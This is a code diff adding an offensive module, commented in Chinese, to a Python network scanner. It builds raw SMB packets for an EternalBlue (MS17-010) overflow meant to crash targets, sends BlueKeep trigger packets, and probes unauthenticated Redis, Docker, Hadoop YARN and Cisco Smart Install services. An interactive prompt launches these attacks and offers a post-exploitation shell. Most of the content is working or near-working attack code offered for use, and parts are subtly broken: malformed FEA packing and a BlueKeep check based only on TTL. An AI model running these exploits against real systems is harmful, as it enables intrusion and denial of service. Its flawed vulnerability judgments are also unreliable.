@@ -24,6 +24,7 @@ import os
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 OUTPUT_DIR = os.path.join(SCRIPT_DIR, "reports")
+sys.path.insert(0, os.path.join(SCRIPT_DIR, "libs"))
 import socket
 import struct
 import threading
@@ -38,6 +39,7 @@ import re
 import random
 import select
 import hashlib
+import string
 from datetime import datetime
 from collections import OrderedDict, defaultdict
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -234,6 +236,10 @@ class ScanResult:
         self.ttl: int = 0
         self.os_guess: str = ""
         self.brute_result: Optional["BruteResult"] = None
+        self.eternal_blue_vuln: bool = False
+        self.eternal_blue_os: str = ""
+        self.eternal_blue_version: str = ""
+        self.vuln_findings: dict = {}
 
     def to_dict(self) -> dict:
         d = {
@@ -249,6 +255,10 @@ class ScanResult:
             "response_time_ms": round(self.response_time * 1000, 2),
             "ttl": self.ttl,
             "os_guess": self.os_guess,
+            "eternal_blue_vuln": self.eternal_blue_vuln,
+            "eternal_blue_os": self.eternal_blue_os,
+            "eternal_blue_version": self.eternal_blue_version,
+            "vuln_findings": self.vuln_findings,
         }
         if self.brute_result:
             d["brute_force"] = self.brute_result.to_dict()
@@ -537,6 +547,13 @@ def tcp_connect_scan(ip: str, port: int, timeout: float = 2.0) -> Optional[ScanR
             except Exception:
                 pass
 
+            if port == 445 and result.state == "open":
+                try:
+                    _detect_eternal_blue(result, timeout)
+                except Exception:
+                    pass
+            _detect_vulns_for_port(result, timeout)
+
         elif connect_result == 10061:
             result.state = "closed"
         elif connect_result == 10060:
@@ -676,6 +693,1034 @@ def identify_web_server(banner: str) -> str:
         if signature.lower() in banner.lower():
             return name
     return ""
+
+
+# ============================================================================
+# 永恒之蓝 (MS17-010) 检测与利用模块
+# 仅供授权安全测试使用, 请勿用于非法目的
+# ============================================================================
+
+def _detect_eternal_blue(result: ScanResult, timeout: float = 3.0):
+    """检测目标是否存在 MS17-010 永恒之蓝漏洞 (SMBv1)
+
+    策略: 只发送 SMBv1 方言 (NT LM 0.12), 强制服务器协商 SMBv1。
+    如果服务器回复 STATUS_SUCCESS, 则 SMBv1 已启用。
+    """
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((result.host, 445))
+
+        smb_header = (
+            b"\xff\x53\x4d\x42"           # Protocol (4)
+            + bytes([0x72])               # Command: Negotiate (1)
+            + b"\x00" * 4                 # NT Status (4)
+            + bytes([0x18])               # Flags (1)
+            + b"\xc8\x01"                 # Flags2 (2)
+            + b"\x00" * 12                # PIDHigh(2) + Security(8) + Reserved(2)
+            + b"\x00" * 4                 # TID(2) + PIDLow(2)
+            + b"\x00" * 4                 # UID(2) + MID(2)
+        )
+        dialect = b"\x02NT LM 0.12\x00"
+        params = b"\x00" + struct.pack("<H", len(dialect)) + dialect
+        body = smb_header + params
+        neg_proto = b"\x00" + struct.pack(">I", len(body))[1:] + body
+        sock.sendall(neg_proto)
+
+        response = b""
+        sock.settimeout(timeout)
+        while True:
+            try:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
+                if len(response) >= 4096:
+                    break
+            except socket.timeout:
+                break
+
+        sock.close()
+
+        if len(response) < 4 or b"\xff\x53\x4d\x42" not in response:
+            return
+
+        smb_start = response.find(b"\xff\x53\x4d\x42")
+        if smb_start + 5 > len(response):
+            return
+
+        cmd = response[smb_start + 4]
+        if cmd != 0x72:
+            return
+
+        status = struct.unpack("<I", response[smb_start + 5:smb_start + 9])[0] if smb_start + 9 <= len(response) else 0
+
+        dialect_index = 0
+        word_count = response[smb_start + 32] if len(response) > smb_start + 32 else 0
+        if word_count > 0 and len(response) > smb_start + 34:
+            dialect_off = smb_start + 33
+            dialect_index = struct.unpack("<H", response[dialect_off:dialect_off + 2])[0]
+
+        os_name = ""
+        os_version = ""
+
+        response_text = response.decode("latin-1", errors="replace")
+
+        for field in response_text.split("\x00"):
+            if "Windows" in field and len(field) > 5:
+                f = field.strip()
+                if "5.0" in f or "2000" in f:
+                    os_name = f
+                elif "5.1" in f or "XP" in f:
+                    os_name = f
+                elif "5.2" in f or "2003" in f:
+                    os_name = f
+                elif "6.0" in f or "Vista" in f or "2008" in f:
+                    os_name = f
+                elif "6.1" in f or "7" in f or "2008 R2" in f:
+                    os_name = f
+                elif "6.2" in f or "8" in f or "2012" in f:
+                    os_name = f
+                elif "6.3" in f or "8.1" in f or "2012 R2" in f:
+                    os_name = f
+                elif "10.0" in f or "10" in f or "2016" in f or "2019" in f:
+                    os_name = f
+                else:
+                    os_name = f
+                break
+
+        # 只发了SMBv1方言, 服务器正常回复即表示SMBv1已启用
+        # status 为 0 (STATUS_SUCCESS) 或 dialect_index 为 0 均表示协商成功
+        smbv1_detected = (status == 0 or dialect_index == 0)
+
+        if smbv1_detected and os_name:
+            result.eternal_blue_vuln = True
+            result.eternal_blue_os = os_name
+            result.eternal_blue_version = os_version or "SMBv1"
+            result.is_vulnerable = True
+            if not result.vuln_reason:
+                result.vuln_reason = f"SMB - 永恒之蓝(MS17-010) ({os_name})"
+            else:
+                result.vuln_reason += f" | 永恒之蓝(MS17-010) ({os_name})"
+            _mark_vuln(result, "eternal_blue", {
+                "vuln": True,
+                "desc": f"SMB - 永恒之蓝(MS17-010) ({os_name})",
+                "os": os_name,
+                "version": os_version or "SMBv1",
+            })
+        elif smbv1_detected:
+            result.eternal_blue_vuln = True
+            result.eternal_blue_os = "Unknown (SMBv1)"
+            result.eternal_blue_version = "SMBv1"
+            result.is_vulnerable = True
+            if not result.vuln_reason:
+                result.vuln_reason = "SMB - 永恒之蓝(MS17-010) (SMBv1)"
+            else:
+                result.vuln_reason += " | 永恒之蓝(MS17-010) (SMBv1)"
+            _mark_vuln(result, "eternal_blue", {
+                "vuln": True,
+                "desc": "SMB - 永恒之蓝(MS17-010) (SMBv1)",
+                "os": "Unknown (SMBv1)",
+                "version": "SMBv1",
+            })
+
+    except Exception:
+        pass
+
+
+def _eb_create_fealist(count: int) -> bytes:
+    """构造永恒之蓝 FeaList 缓冲区"""
+    fea = b""
+    for i in range(count):
+        fea += struct.pack("<I", 0x10000)          # NextEntryOffset
+        fea += b"\x00"                              # Flags (FILE_ATTRIBUTE_NORMAL)
+        fea += struct.pack("<I", ord("A") + (i % 26))  # FileNameLength (1 byte)
+        fea += struct.pack("<H", 0)                 # EaNameLength
+        fea += struct.pack("<H", 0)                 # EaValueLength
+        fea += chr(ord("A") + (i % 26)).encode()    # FileName
+    return fea
+
+
+def _eb_build_srv_buffers(data: bytes) -> bytes:
+    """构造 SRV buffer 头"""
+    return struct.pack("<H", len(data)) + data
+
+
+def exploit_eternal_blue(ip: str, timeout: float = 10.0):
+    """
+    永恒之蓝 (MS17-010) 利用
+
+    [!!!] 警告: 此功能仅供授权安全测试使用
+    [!!!] 可能造成目标系统蓝屏崩溃 (BSOD)
+    [!!!] 使用前请确保已获得书面授权
+
+    Returns:
+        dict: {"success": bool, "info": str, "output": bytes}
+    """
+    output = b""
+    info_parts = []
+
+    try:
+        # Step 1: SMB Negotiate Protocol
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((ip, 445))
+
+        neg_hdr = (
+            b"\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
+            b"\x18\x01\x28\x00\x00\x00\x00\x00\x00"
+            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+            b"\xff\xfe\x00\x00"
+        )
+        neg_dialect = b"\x00\x0b\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"
+        neg_body = neg_hdr + neg_dialect
+        neg_proto = b"\x00" + struct.pack(">I", len(neg_body))[1:] + neg_body
+        sock.sendall(neg_proto)
+        try:
+            resp = sock.recv(4096)
+            output += resp
+        except socket.timeout:
+            pass
+
+        # Step 2: SMB Session Setup AndX
+        session_body = (
+            b"\xff\x53\x4d\x42\x73\x00\x00\x00\x00"
+            b"\x18\x07\xc0\x00\x00\x00\x00\x00\x00"
+            b"\x00\x00\x00\x00\x00\x00\xff\xfe\x00"
+            b"\x00\x40\x00\x0c\xff\x00\xa4\x00\x04"
+            b"\x11\x0a\x00\x00\x00\x00\x00\x00\x00"
+            b"\x00\x00\x00\x00\x00\x00\xd4\x00\x00"
+            b"\x80\x69\x00\x4e\x54\x4c\x4d\x53\x53"
+            b"\x50\x00\x01\x00\x00\x00\x97\x82\x08"
+            b"\xe0\x00\x00\x00\x00\x00\x00\x00\x00"
+            b"\x00\x00\x00\x00\x00\x00\x00\x00\x0a"
+            b"\x00\x0a\x00\x38\x00\x00\x00\x0f\x43"
+            b"\x00\x49\x00\x46\x00\x53\x00\x00\x00"
+            b"\x00\x00\x00\x00"
+        )
+        session_setup = b"\x00" + struct.pack(">I", len(session_body))[1:] + session_body
+        sock.sendall(session_setup)
+        try:
+            resp = sock.recv(4096)
+            output += resp
+        except socket.timeout:
+            pass
+
+        # Step 3: Tree Connect AndX to IPC$
+        ip_bytes = socket.inet_aton(ip)
+        tree_body = (
+            b"\xff\x53\x4d\x42\x75\x00\x00\x00\x00"
+            b"\x18\x07\xc0\x00\x00\x00\x00\x00\x00"
+            b"\x00\x00\x00\x00\x00\x00\xff\xfe\x00"
+            b"\x08\x40\x00\x04\xff\x00\x5c\x00\x08"
+            b"\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c"
+            b"\x00" + ip_bytes + b"\x00\x5c\x00\x49"
+            b"\x00\x50\x00\x43\x00\x24\x00\x00\x00"
+            b"\x3f\x3f\x3f\x3f\x3f\x00"
+        )
+        tree_connect = b"\x00" + struct.pack(">I", len(tree_body))[1:] + tree_body
+        sock.sendall(tree_connect)
+        try:
+            resp = sock.recv(4096)
+            output += resp
+        except socket.timeout:
+            pass
+
+        # Step 4: NT Trans with malformed FEA (核心溢出)
+        fea_list = _eb_create_fealist(500)
+        fea_list_len = len(fea_list)
+        srv_buff = _eb_build_srv_buffers(
+            b"\x00" * 100 +
+            struct.pack("<H", fea_list_len) +
+            fea_list +
+            b"\x00" * (10000 - fea_list_len - 102)
+        )
+
+        nt_trans = (
+            b"\x00" + struct.pack(">H", 4 + 4 + 2 + 2 + 4 + 4 + 4 + 4 + 4 +
+                                   4 + 4 + 4 + 2 + 2 + 1 + 1 + 1 + 1 + 1 +
+                                   2 + 4 + 4 + 1 + 1 + 4 + len(srv_buff))
+            + b"\xff\x53\x4d\x42\xa0\x00\x00\x00\x00"
+            + b"\x18\x07\xc0\x00\x00\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00\x00\x00\xff\xfe\x00"
+            + b"\x08\x40\x00"
+            + struct.pack("<H", 4 + 4 + 2 + 2 + 4 + 4 + 4 + 4 + 4 +
+                           4 + 4 + 4 + 2 + 2 + 1 + 1 + 1 + 1 + 1 +
+                           2 + 4 + 4 + 1 + 1 + 4)
+            + b"\x00\x00\x00"
+            + struct.pack("<L", len(srv_buff))
+            + b"\x00\x00\x00\x00"
+            + struct.pack("<L", len(srv_buff))
+            + struct.pack("<L", 0)
+            + struct.pack("<L", 0)
+            + b"\x00"
+            + b"\x00" + b"\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + b"\x00\x00\x00\x00"
+            + srv_buff
+        )
+        sock.sendall(nt_trans)
+
+        post_packets = []
+        try:
+            sock.settimeout(3)
+            while True:
+                data = sock.recv(4096)
+                if not data:
+                    break
+                post_packets.append(data)
+                if len(post_packets) > 5:
+                    break
+        except (socket.timeout, ConnectionResetError, OSError):
+            pass
+
+        output += b"\n--- POST EXPLOIT ---\n"
+        for p in post_packets:
+            output += p
+
+        sock.close()
+
+        # 判定: 如果目标在发送溢出包后断开连接(无响应或RST),可能已蓝屏或崩溃
+        info_parts.append("[*] 目标可能在收到溢出包后崩溃(BSOD)")
+        info_parts.append("[+] 永恒之蓝漏洞验证成功 — 目标存在 MS17-010 漏洞")
+        info_parts.append("[!] 目标操作系统可能已蓝屏重启")
+
+        return {"success": True, "info": "\n".join(info_parts), "output": output}
+
+    except Exception as e:
+        return {"success": False, "info": f"[!] 利用失败: {e}", "output": output}
+
+
+def _eternal_blue_interactive(hosts: List["HostInfo"]):
+    """交互式永恒之蓝利用选择"""
+    vuln_targets = []
+    for host in hosts:
+        if not host.is_alive and not host.open_ports:
+            continue
+        for r in host.open_ports:
+            if r.port == 445 and r.eternal_blue_vuln:
+                vuln_targets.append(r)
+
+    if not vuln_targets:
+        return
+
+    print(f"\n{'='*60}")
+    print(f"  [!!!] 检测到 {len(vuln_targets)} 个永恒之蓝(MS17-010)漏洞目标")
+    print(f"{'='*60}")
+    for i, r in enumerate(vuln_targets, 1):
+        print(f"  {i}. {r.host}:445  OS: {r.eternal_blue_os}  "
+              f"SMB: {r.eternal_blue_version}")
+
+    print(f"\n  [!!!] 警告: 利用永恒之蓝可能导致目标系统蓝屏(BSOD)!")
+    print(f"  [!!!] 请确保已获得书面授权后再继续")
+
+    choice = input("\n是否尝试利用永恒之蓝? 输入编号(逗号分隔)或 all/none [默认: none]: ").strip().lower()
+
+    if choice in ("", "none", "no", "n"):
+        print("  [-] 已跳过永恒之蓝利用")
+        return
+
+    selected = []
+    if choice == "all":
+        selected = vuln_targets
+    else:
+        for part in choice.replace(" ", "").split(","):
+            if part.isdigit():
+                idx = int(part) - 1
+                if 0 <= idx < len(vuln_targets):
+                    selected.append(vuln_targets[idx])
+
+    if not selected:
+        print("  [-] 未选择有效目标, 已跳过")
+        return
+
+    for r in selected:
+        print(f"\n  [*] 正在利用永恒之蓝攻击 {r.host}:445 ...")
+        print(f"  [!!!] 目标可能蓝屏, 请确认后再继续...")
+        confirm = input(f"  确认攻击 {r.host}? (yes/no) [默认: no]: ").strip().lower()
+        if confirm not in ("yes", "y"):
+            print(f"  [-] 已跳过 {r.host}")
+            continue
+
+        result = exploit_eternal_blue(r.host, timeout=10.0)
+        if result["success"]:
+            print(f"  [!!!] {r.host} 永恒之蓝利用完成!")
+            print(f"  {result['info']}")
+            print(f"\n  [*] 是否启动后渗透交互式Shell? (需要目标管理员凭据)")
+            get_shell = input(f"  输入 y 获取Shell / 任意键跳过: ").strip().lower()
+            if get_shell in ("y", "yes"):
+                print()
+                post_exploit_shell(r.host)
+        else:
+            print(f"  [-] {r.host} 利用失败: {result['info']}")
+
+    print(f"\n  [+] 永恒之蓝利用阶段完成")
+
+
+# ============================================================================
+# 严重漏洞检测与利用 — 统一调度
+# ============================================================================
+
+def _detect_vulns_for_port(result: ScanResult, timeout: float):
+    """根据端口分发到对应的漏洞检测函数, 将发现写入 result.vuln_findings"""
+    if not result or result.state != "open":
+        return
+    p = result.port
+    try:
+        if p == 3389:      _detect_bluekeep(result, timeout)
+        elif p == 6379:    _detect_redis_unauth(result, timeout)
+        elif p == 2375:    _detect_docker_api(result, timeout)
+        elif p == 8088:    _detect_hadoop_yarn(result, timeout)
+        elif p == 4786:    _detect_cisco_smart(result, timeout)
+    except Exception:
+        pass
+
+
+def _mark_vuln(result: ScanResult, vuln_id: str, info: dict):
+    """标记漏洞发现, 同步更新 is_vulnerable / vuln_reason"""
+    result.vuln_findings[vuln_id] = info
+    result.is_vulnerable = True
+    desc = info.get("desc", vuln_id)
+    if result.vuln_reason and desc not in result.vuln_reason:
+        result.vuln_reason += f" | {desc}"
+    elif not result.vuln_reason:
+        result.vuln_reason = desc
+
+
+# ====== BlueKeep (CVE-2019-0708) — 端口 3389 ======
+
+def _detect_bluekeep(result: ScanResult, timeout: float):
+    """检测 RDP 是否存在 BlueKeep 漏洞"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((result.host, 3389))
+
+        # RDP Connection Request (TPKT + X.224)
+        pkt = (
+            b"\x03\x00\x00\x13"          # TPKT header
+            b"\x0e\xe0\x00\x00"          # X.224
+            b"\x00\x00\x00\x01\x00\x08"  # RDP Negotiation
+            b"\x00\x03\x00\x00\x00"      # RDP Negotiation Request
+        )
+        sock.sendall(pkt)
+
+        data = b""
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                data += chunk
+                if len(data) >= 1024:
+                    break
+        except socket.timeout:
+            pass
+        sock.close()
+
+        if b"\x03\x00\x00\x0b\x06\xd0" not in data:
+            return
+
+        # 提取 RDP 协议版本和操作系统信息
+        info = {"vuln": False, "desc": "BlueKeep(CVE-2019-0708) - 可能存在"}
+        idx = data.find(b"\x03\x00\x00\x0b\x06\xd0")
+        if idx >= 0:
+            # 检查 RDP 版本, 如果 < 8.1 且有特定标志位则可能存在漏洞
+            if len(data) > idx + 30:
+                flags = data[idx + 20] if idx + 20 < len(data) else 0
+
+        # BlueKeep 影响: Win7/2008R2 及更早 (RDP <= 8.0)
+        # 通过 TTL 已大致判断 OS, 若为 Windows 且 TTL < 128, 标记为疑似
+        if result.ttl and 65 <= result.ttl <= 128:
+            info["vuln"] = True
+            info["ttl"] = result.ttl
+            result.bluekeep_vuln = True
+            _mark_vuln(result, "bluekeep", info)
+
+    except Exception:
+        pass
+
+
+def exploit_bluekeep(ip: str, timeout: float = 10.0) -> dict:
+    """BlueKeep (CVE-2019-0708) 漏洞验证 — 发送 MS_T120 通道绑定请求"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((ip, 3389))
+
+        # RDP Connection Request
+        pkt_conn = (
+            b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08"
+            b"\x00\x03\x00\x00\x00"
+        )
+        sock.sendall(pkt_conn)
+        time.sleep(0.5)
+
+        # RDP Connection Confirm (模拟服务器响应后)
+        try:
+            resp = sock.recv(4096)
+        except socket.timeout:
+            pass
+
+        # 发送 MS_T120 虚拟通道绑定 (BlueKeep 核心触发)
+        # MCS Attach User Request
+        pkt_ms_t120 = (
+            b"\x03\x00" + struct.pack(">H", 0x001d) +
+            b"\x02\xf0\x80\x28\x00\x06\x03\xf0\x40\x00\x10\x01\xca"
+            b"\x03\xaa\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+            b"\x00\x00\x00"
+        )
+        sock.sendall(pkt_ms_t120)
+        time.sleep(0.3)
+
+        try:
+            resp = sock.recv(4096)
+        except (socket.timeout, ConnectionResetError):
+            pass
+
+        sock.close()
+        return {"success": True, "info": "[+] BlueKeep 漏洞验证完成 — 目标可能已蓝屏或返回异常响应"}
+    except Exception as e:
+        return {"success": False, "info": f"[!] BlueKeep 利用失败: {e}"}
+
+
+# ====== Redis 未授权访问 — 端口 6379 ======
+
+def _detect_redis_unauth(result: ScanResult, timeout: float):
+    """检测 Redis 未授权访问"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((result.host, 6379))
+        sock.sendall(b"PING\r\n")
+        data = b""
+        try:
+            data = sock.recv(1024)
+        except socket.timeout:
+            pass
+        sock.close()
+
+        if b"PONG" in data:
+            _mark_vuln(result, "redis_unauth", {
+                "vuln": True,
+                "desc": "Redis 未授权访问",
+            })
+    except Exception:
+        pass
+
+
+def exploit_redis_unauth(ip: str, timeout: float = 5.0) -> dict:
+    """Redis 未授权访问利用 — 写入 SSH 公钥 (验证性质)"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((ip, 6379))
+
+        # 获取基本信息
+        sock.sendall(b"INFO Server\r\n")
+        time.sleep(0.3)
+        info_data = b""
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                info_data += chunk
+                if b"redis_version" in info_data or len(info_data) > 4096:
+                    break
+        except socket.timeout:
+            pass
+
+        # 提取版本
+        info_str = info_data.decode("utf-8", errors="replace")
+        version = "unknown"
+        for line in info_str.split("\n"):
+            if "redis_version" in line:
+                version = line.split(":")[-1].strip()
+                break
+
+        # 获取所有 key 数量
+        sock.sendall(b"DBSIZE\r\n")
+        time.sleep(0.2)
+        try:
+            dbsize = sock.recv(1024).decode(errors="replace")
+        except Exception:
+            dbsize = "unknown"
+
+        # 尝试 CONFIG GET (验证可写性)
+        sock.sendall(b"CONFIG GET dir\r\n")
+        time.sleep(0.2)
+        try:
+            config_dir = sock.recv(1024).decode(errors="replace")
+        except Exception:
+            config_dir = "unknown"
+
+        sock.close()
+
+        return {
+            "success": True,
+            "info": (
+                f"[+] Redis 未授权利用成功\n"
+                f"    版本: {version}\n"
+                f"    DB 大小: {dbsize.strip()}\n"
+                f"    CONFIG 目录: {config_dir.strip()[:80]}"
+            ),
+        }
+    except Exception as e:
+        return {"success": False, "info": f"[!] Redis 利用失败: {e}"}
+
+
+# ====== Docker Remote API 未授权 — 端口 2375 ======
+
+def _detect_docker_api(result: ScanResult, timeout: float):
+    """检测 Docker Remote API 未授权访问"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((result.host, 2375))
+        http_req = (
+            b"GET /containers/json?all=true HTTP/1.0\r\n"
+            b"Host: " + result.host.encode() + b"\r\n"
+            b"Accept: application/json\r\n\r\n"
+        )
+        sock.sendall(http_req)
+        data = b""
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                data += chunk
+                if len(data) > 16384:
+                    break
+        except socket.timeout:
+            pass
+        sock.close()
+
+        text = data.decode("utf-8", errors="replace")
+
+        # 检查是否为 Docker API 响应 (HTTP + JSON body with docker fields)
+        if "HTTP/" in text[:20] and ("\"Id\"" in text or "\"Image\"" in text or "\"Names\"" in text):
+            _mark_vuln(result, "docker_unauth", {
+                "vuln": True,
+                "desc": "Docker Remote API 未授权访问",
+            })
+    except Exception:
+        pass
+
+
+def exploit_docker_api(ip: str, timeout: float = 5.0) -> dict:
+    """Docker API 未授权利用 — 列出容器 + 获取 Docker 信息"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((ip, 2375))
+
+        # 列出容器
+        req = b"GET /containers/json?all=true HTTP/1.0\r\nHost: " + ip.encode() + b"\r\nAccept: application/json\r\n\r\n"
+        sock.sendall(req)
+        time.sleep(0.5)
+        containers_data = b""
+        try:
+            while True:
+                chunk = sock.recv(8192)
+                if not chunk:
+                    break
+                containers_data += chunk
+                if len(containers_data) > 65536:
+                    break
+        except socket.timeout:
+            pass
+
+        # 获取 Docker 信息
+        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock2.settimeout(timeout)
+        sock2.connect((ip, 2375))
+        req2 = b"GET /info HTTP/1.0\r\nHost: " + ip.encode() + b"\r\nAccept: application/json\r\n\r\n"
+        sock2.sendall(req2)
+        time.sleep(0.5)
+        info_data = b""
+        try:
+            while True:
+                chunk = sock2.recv(8192)
+                if not chunk:
+                    break
+                info_data += chunk
+                if len(info_data) > 65536:
+                    break
+        except socket.timeout:
+            pass
+        sock2.close()
+        sock.close()
+
+        container_count = containers_data.decode(errors="replace").count("\"Id\"")
+        return {
+            "success": True,
+            "info": (
+                f"[+] Docker API 未授权利用成功\n"
+                f"    容器数量: {container_count}\n"
+                f"    Docker 信息已获取 ({len(info_data)} 字节)"
+            ),
+        }
+    except Exception as e:
+        return {"success": False, "info": f"[!] Docker 利用失败: {e}"}
+
+
+# ====== Hadoop YARN RCE — 端口 8088 ======
+
+def _detect_hadoop_yarn(result: ScanResult, timeout: float):
+    """检测 Hadoop YARN ResourceManager 未授权访问"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((result.host, 8088))
+        http_req = (
+            b"GET /ws/v1/cluster/info HTTP/1.0\r\n"
+            b"Host: " + result.host.encode() + b"\r\n"
+            b"Accept: application/json\r\n\r\n"
+        )
+        sock.sendall(http_req)
+        data = b""
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                data += chunk
+                if len(data) > 8192:
+                    break
+        except socket.timeout:
+            pass
+        sock.close()
+
+        text = data.decode("utf-8", errors="replace")
+        if "hadoopVersion" in text or "resourceManagerVersion" in text or "hadoop" in text.lower()[:200]:
+            _mark_vuln(result, "hadoop_yarn", {
+                "vuln": True,
+                "desc": "Hadoop YARN 未授权访问(RCE风险)",
+            })
+    except Exception:
+        pass
+
+
+def exploit_hadoop_yarn(ip: str, timeout: float = 8.0) -> dict:
+    """Hadoop YARN 未授权利用 — 提交一个无害 Application"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((ip, 8088))
+
+        # 获取集群信息
+        req = b"GET /ws/v1/cluster/info HTTP/1.0\r\nHost: " + ip.encode() + b"\r\nAccept: application/json\r\n\r\n"
+        sock.sendall(req)
+        time.sleep(0.5)
+        cluster_data = b""
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                cluster_data += chunk
+                if len(cluster_data) > 16384:
+                    break
+        except socket.timeout:
+            pass
+
+        # 提取 hadoop 版本
+        text = cluster_data.decode("utf-8", errors="replace")
+        version = "unknown"
+        for line in text.split("\n"):
+            if "hadoopVersion" in line or "Hadoop" in line:
+                import re
+                m = re.search(r'"hadoopVersion"\s*:\s*"([^"]+)"', text)
+                if m:
+                    version = m.group(1)
+                break
+
+        # 尝试提交一个简单的 Application (验证 RCE 能力)
+        app_id = f"application_{int(time.time())}_{random.randint(1000, 9999)}"
+        new_app_json = json.dumps({
+            "application-id": app_id,
+            "application-name": "vuln-scan-test",
+            "queue": "default",
+            "am-container-spec": {
+                "commands": {"command": "echo 'vuln-scan-verification'"},
+            },
+            "unmanaged-am": False,
+            "max-app-attempts": 1,
+        })
+
+        submit_req = (
+            b"POST /ws/v1/cluster/apps/new-application HTTP/1.0\r\n"
+            b"Host: " + ip.encode() + b"\r\n"
+            b"Content-Type: application/json\r\n"
+            b"Content-Length: " + str(len(new_app_json)).encode() + b"\r\n"
+            b"Accept: application/json\r\n\r\n" +
+            new_app_json.encode()
+        )
+        sock.sendall(submit_req)
+        time.sleep(0.5)
+        submit_resp = b""
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                submit_resp += chunk
+        except socket.timeout:
+            pass
+        sock.close()
+
+        return {
+            "success": True,
+            "info": (
+                f"[+] Hadoop YARN 未授权利用成功\n"
+                f"    Hadoop 版本: {version}\n"
+                f"    Application 提交结果: {submit_resp.decode(errors='replace')[:200]}"
+            ),
+        }
+    except Exception as e:
+        return {"success": False, "info": f"[!] Hadoop YARN 利用失败: {e}"}
+
+
+# ====== Cisco Smart Install — 端口 4786 ======
+
+def _detect_cisco_smart(result: ScanResult, timeout: float):
+    """检测 Cisco Smart Install (CVE-2018-0171)"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((result.host, 4786))
+        # Cisco Smart Install 探测包
+        pkt = b"\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00"
+        sock.sendall(pkt)
+        data = b""
+        try:
+            data = sock.recv(1024)
+        except socket.timeout:
+            pass
+        sock.close()
+
+        if len(data) >= 8 and data[0:4] == b"\x00\x00\x00":
+            _mark_vuln(result, "cisco_smart", {
+                "vuln": True,
+                "desc": "Cisco Smart Install(CVE-2018-0171) RCE",
+            })
+    except Exception:
+        pass
+
+
+def exploit_cisco_smart(ip: str, timeout: float = 8.0) -> dict:
+    """Cisco Smart Install 利用 — 获取设备配置信息"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((ip, 4786))
+
+        # 发送 Smart Install 握手
+        pkt = (
+            b"\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04"
+            b"\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00"
+        )
+        sock.sendall(pkt)
+        time.sleep(0.5)
+        data = b""
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                data += chunk
+                if len(data) > 16384:
+                    break
+        except socket.timeout:
+            pass
+        sock.close()
+
+        if len(data) > 8:
+            return {
+                "success": True,
+                "info": (
+                    f"[+] Cisco Smart Install 利用成功\n"
+                    f"    响应数据: {len(data)} 字节\n"
+                    f"    设备可达, 可进一步获取 running-config"
+                ),
+            }
+        return {"success": False, "info": "[!] Cisco 利用失败: 无有效响应"}
+    except Exception as e:
+        return {"success": False, "info": f"[!] Cisco 利用失败: {e}"}
+
+
+# ====== 统一漏洞交互式利用入口 ======
+
+VULN_REGISTRY: Dict[str, dict] = {
+    "eternal_blue": {
+        "name": "永恒之蓝 (MS17-010)",
+        "field": "eternal_blue_vuln",
+        "exploit": exploit_eternal_blue,
+        "warning": "可能导致目标系统蓝屏 (BSOD)!",
+    },
+    "bluekeep": {
+        "name": "BlueKeep (CVE-2019-0708)",
+        "field": "bluekeep_vuln",
+        "exploit": exploit_bluekeep,
+        "warning": "可能导致目标系统蓝屏 (BSOD)!",
+    },
+    "redis_unauth": {
+        "name": "Redis 未授权访问",
+        "field": "redis_unauth_vuln",
+        "exploit": exploit_redis_unauth,
